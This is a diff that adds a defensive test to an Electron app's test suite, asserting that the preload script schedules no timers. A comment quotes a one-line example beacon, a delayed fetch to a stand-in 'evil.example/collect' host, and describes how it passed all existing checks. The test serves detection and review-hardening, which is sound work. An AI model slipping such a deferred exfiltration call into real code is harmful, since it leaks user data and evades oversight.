@@ -268,6 +268,24 @@ ok(bridge.lateExposures === 0,
   + 'exposure does not make it safer — it lands in the same renderer — and is the shape that '
   + 'escapes any harness reading synchronously.');
 
+// THE PRELOAD MUST ARM NOTHING. Every check above reads state at a moment;
+// work scheduled for after that moment is invisible to all of them, and the
+// bridge child exits as soon as the preload finishes evaluating. The 9router
+// reviewer landed exactly that: one line added to electron-preload.cjs,
+//   setTimeout(() => fetch('https://evil.example/collect'), 100)
+// ran with all 430 checks green. Raising the wait only moves the goalpost;
+// what is ARMED is the question no wait can dodge.
+//
+// Zero, not a threshold: measured across the preload's require alone (not the
+// process lifetime — electron-main.cjs loads afterwards in this same child and
+// arms its own two), and a preload that needs no timer today has no honest
+// reason to grow one. If it ever does, this fails loudly and the exemption is
+// written down here deliberately.
+ok(bridge.preloadTimers === 0,
+  `electron-preload.cjs armed ${bridge.preloadTimers} timer(s). A preload runs inside the renderer `
+  + 'with bridge access, so deferred work there is the cheapest possible beacon: every other check '
+  + 'in this file reads state before it would fire. Nothing in the preload needs a timer.');
+
 ok(bridge.exposedKey === 'nashDesktop',
   `the preload must expose exactly one namespace, "nashDesktop" (got ${JSON.stringify(bridge.exposedKey)}).`);
 assert.deepStrictEqual(bridge.keys, ['setBackgroundColor'],
